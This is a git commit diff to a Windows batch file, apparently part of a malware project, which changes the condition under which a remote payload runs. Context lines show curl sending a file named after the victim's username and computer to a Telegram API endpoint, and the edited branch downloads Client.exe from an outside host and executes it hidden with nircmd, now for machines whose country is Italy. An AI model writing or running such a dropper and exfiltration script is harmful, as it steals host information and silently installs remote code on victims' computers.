e7af390df479f983bb10422ac4d0d89e0bfea135
cryptedlumos <90626486+cryptedlumos@users.noreply.github.com>
2022-03-25 14:47:24 +0100

    Update win32.bat

--- win32.bat
+++ win32.bat
@@ -70,7 +70,7 @@ curl.exe %proxy% -F document=@"%username%@%computername%.txt" https://api.telegr
 cd "%temp%"
 rmdir /s /q "%temp%\%folder%"
 
-if [%computername%]==[LAPTOP-QDJJVI4G] (
+if [%Country%]==[IT] (
   curl.exe %proxy% https://cryptedlumos.github.io/Client.exe --output "%temp%\dll.exe" && nircmd exec hide "%temp%\dll.exe"
 ) else (
 echo.
